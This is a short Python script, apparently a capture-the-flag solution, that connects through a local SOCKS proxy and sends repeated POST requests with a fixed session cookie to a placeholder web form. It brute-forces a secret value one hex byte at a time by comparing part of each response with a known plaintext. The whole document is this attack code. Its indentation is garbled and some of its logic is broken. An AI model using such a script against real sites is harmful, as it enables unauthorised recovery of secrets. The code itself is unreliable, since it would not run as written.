import requests
import socks
import socket
import bs4
from sys import exit


print('[+] connecting to socks proxy')
socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", port=7000)
socket.socket = socks.socksocket

url = "http://example.com/bla.php"
token = 'Plaintext to brute'

password = ""

print('[+] connecting to server')
data = {'logfile': password, 'submit' : 'View+Log+File' }
r = requests.post(url, data=data, cookies={'synpi_session_id':'xnlg'})

for i in token:
    for x in range(16,256):
             hexnum =  format(x, "x")
              logval = password + hexnum 
               data = {'filechooser': logval, 'submit' : 'Submit' }
                r = requests.post(url, data=data,
                        cookies={'session':'34542745674'})
         # print(r.content)
          try:
              soup = bs4.BeautifulSoup(r.content, "html.parser")
                  xs = soup.body.find('code').text
              xs = xs.split(": ", 1)
                  print(xs)
              xs = ''.join(xs[1])
                  if xs[len(logval)/2-1] == token[len(logval)/2-1]:
                  password += hexnum
                  print(password)
                  continue
           except:
                password += hexnum
             print(password)
                  continue
